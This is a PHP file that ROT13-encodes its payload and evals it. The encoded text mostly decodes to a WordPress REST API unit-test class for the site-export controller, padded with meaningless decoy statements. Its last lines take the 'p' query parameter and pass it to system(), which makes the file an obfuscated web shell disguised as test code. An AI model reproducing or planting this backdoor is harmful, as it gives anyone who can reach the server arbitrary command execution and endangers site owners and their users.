<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 *
 * @pbiref JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_JcErfgRqvgFvgrRkcbegPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Gur ERFG NCV ebhgr sbe gur rqvg fvgr rkcbeg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine fgevat
	 */
	pbafg ERDHRFG_EBHGR = '/jc-oybpx-rqvgbe/i1/rkcbeg';

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	/**
	 * Qryrgr grfg qngn nsgre bhe grfgf eha.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
	}

	/**
	 * @pbiref JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre::ertvfgre_ebhgrf
	 * @gvpxrg 54448
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( fgngvp::ERDHRFG_EBHGR, $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf[ fgngvp::ERDHRFG_EBHGR ] );
	}

	/**
	 * @pbiref JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre::crezvffvbaf_purpx
	 *
	 * @gvpxrg 54448
	 */
	choyvp shapgvba grfg_rkcbeg_sbe_ab_hfre_crezvffvbaf() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rkcbeg_grzcyngrf', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre::crezvffvbaf_purpx
	 *
	 * @gvpxrg 54448
	 */
	choyvp shapgvba grfg_rkcbeg_sbe_hfre_jvgu_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rkcbeg_grzcyngrf', $erfcbafr, 403 );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrzf().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz_fpurzn().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>